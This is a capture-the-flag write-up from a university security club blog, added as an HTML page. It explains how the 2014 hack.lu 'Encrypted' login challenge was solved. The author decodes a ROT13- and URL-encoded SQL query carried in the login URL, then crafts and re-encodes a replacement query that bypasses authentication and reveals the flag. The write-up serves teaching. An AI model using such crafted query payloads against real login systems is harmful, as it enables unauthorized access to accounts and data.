@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Encrypted</title>
+  <meta name="description" content="https://wildwildweb.fluxfingers.net:1411SolutionThis was one of the easiest challenges in the 2014 hack.lu CTF, and itinvolved a simple web log in interface....">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="/css/bootstrap.css">
+  <script src="/js/jquery-1.10.2.min.js"></script>
+  <script src="/js/bootstrap.min.js"></script>
+  <link rel="canonical" href="http://afnom.net/2014/10/23/24-Encrypted.html">
+  <link rel="alternate" type="application/rss+xml" title="AFiniteNumberOfMonkeys" href="http://afnom.net/feed.xml" />
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <div class="navbar navbar-default navbar-fixed-top">
+      <div class="container">
+        <div class="navbar-header">
+          <a href="http://afnom.net/" class="navbar-brand">AFiniteNumberOfMonkeys</a>
+          <button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+        </div>
+        <div class="navbar-collapse collapse" id="navbar-main">
+          <ul class="nav navbar-nav navbar-right">
+			<li class="dropdown">
+			   <a class="dropdown-toggle" data-toggle="dropdown" href="http://afnom.net" id="home">Home <span class="caret"></span></a>
+			   <ul class="dropdown-menu" aria-labelledby="home">
+			     <li><a href="#who">Who we are</a></li>
+			     <li><a href="#meetings">Meetings</a></li>
+			     <li><a href="#tools">Tools</a></li>
+			     <li><a href="#materials">Learning material</a></li>
+			     <li><a href="#contact">Contact</a></li>
+			   </ul>
+			 </li>
+            <li><a href="http://afnom.net/writeups.html">Write-ups</a></li>
+          </ul>
+
+        </div>
+      </div>
+    </div>
+</div>
+
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+
+
+</header>
+
+
+    <div class="page-content">
+      <div class="container">
+        <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Encrypted</h1>
+    <p class="post-meta">Oct 23, 2014 • Abstract</p>
+  </header>
+
+  <article class="post-content">
+    <p><a href="https://wildwildweb.fluxfingers.net
+:1411">https://wildwildweb.fluxfingers.net:1411</a></p>
+
+<h2 id="solution">Solution</h2>
+
+<p>This was one of the easiest challenges in the 2014 hack.lu CTF, and it
+involved a simple web log in interface. Checking the page’s source code
+revealed nothing interesting so I entered a test username and password and was
+taken to a page telling me that the login had failed. Again, there was nothing
+interesting in the page’s source code. However, the URL of the log in failed
+page was:</p>
+
+<pre><code>https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG+%60anzr%60+SEBZ+%60hfref%60+JURER+%60anzr%60+%3D+%27nnnn%27+NAQ+%60cnffjbeq%60+%3D+ZQ5%28%27oooo%27%29
+</code></pre>
+
+<p>i.e. as a massive flashing red light in an hacking challenge. Removing the URL
+encoding (using <a href="http://meyerweb.com
+/eric/tools/dencoder/">http://meyerweb.com/eric/tools/dencoder/</a>) this became:</p>
+
+<pre><code>https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG `anzr` SEBZ `hfref` JURER `anzr` = 'nnnn' NAQ `cnffjbeq` = ZQ5('oooo')
+</code></pre>
+
+<p>As an additional test I entered <code>abcdef</code> as the username and <code>12345</code> as the
+password and got:</p>
+
+<pre><code>https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG `anzr` SEBZ `hfref` JURER `anzr` = 'nopqrs' NAQ `cnffjbeq` = ZQ5('12345')
+</code></pre>
+
+<p><code>abcdef</code> seems to have become <code>nopqrs</code> and <code>12345</code> became <code>12345</code>, so this is
+ROT13 encoding. ROT13 decoding (<a href="http://www.rot13.com">http://www.rot13.com</a>)
+the whole URL we get:</p>
+
+<pre><code>https://wildwildweb.fluxfingers.net:1411/dologin.php?query=SELECT `name` FROM `users` WHERE `name` = 'abcdef' AND `password` = MD5('12345')
+</code></pre>
+
+<p>I.e., SQL is being past to the login page as a query. We change this to a
+query that will always work:</p>
+
+<pre><code>https://wildwildweb.fluxfingers.net:1411/dologin.php?query=SELECT `name` FROM `users`
+</code></pre>
+
+<p>ROT13 encode it:</p>
+
+<pre><code>https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG `anzr` SEBZ `hfref`
+</code></pre>
+
+<p>URL encode it:</p>
+
+<pre><code>https://wildwildweb.fluxfingers.net:1411/dologin.php?dhrel=FRYRPG+%60anzr%60+SEBZ+%60hfref%60
+</code></pre>
+
+<p>And going to this URL we get the flag:</p>
+
+<pre><code>Encrypted Login
+
+Hello admin! The flag is flag{nobody_needs_server_side_validation}.
+</code></pre>
+
+  </article>
+
+</div>
+
+      </div>
+    </div>
+
+    <hr>
+<footer class="site-footer">
+
+  <div class="container">
+
+    <div class="row">
+      <div class="col-lg-12">
+
+       
+        <p><p>Copyright &copy; University of Birmingham 2014</p></p>
+
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
